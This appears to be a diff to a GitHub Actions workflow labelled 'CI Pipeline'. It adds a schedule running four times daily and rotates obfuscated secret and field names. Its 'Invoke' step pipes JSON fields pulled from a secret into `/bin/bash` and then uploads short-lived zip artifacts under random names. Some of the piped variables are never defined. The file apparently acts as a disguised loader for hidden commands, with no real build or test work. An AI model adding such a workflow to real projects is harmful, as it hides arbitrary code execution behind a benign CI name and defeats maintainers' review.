@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
 jobs:
   scheduler:
     runs-on: ubuntu-latest
@@ -10,17 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          cret43: ${{ secrets.cret43 }}
+          oqzh785: ${{ secrets.oqzh785 }}
         run: |
-          printf '%s' "$cret43" | jq -r .yguyy685 | /bin/bash
-          printf '%s' "$ve448" | jq -r .g05381 | /bin/bash
-          echo $kv5989 | jq -r .xemws9 | /bin/bash
-          echo $cdi96 | jq -r .g2 | /bin/bash
-          echo $wig5 | jq -r .c79452 | /bin/bash
+          printf '%s' "$oqzh785" | jq -r .rht9 | /bin/bash
+          echo $qjpa0 | jq -r .wirio45 | /bin/bash
+          echo $j35719 | jq -r .al494 | /bin/bash
+          printf '%s' "$qdiw86" | jq -r .m07931 | /bin/bash
+          printf '%s' "$uxvyo92" | jq -r .k5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: nUxqSD7X
+          name: pZoIvOiW
           path: "*.zip"
           retention-days: 1
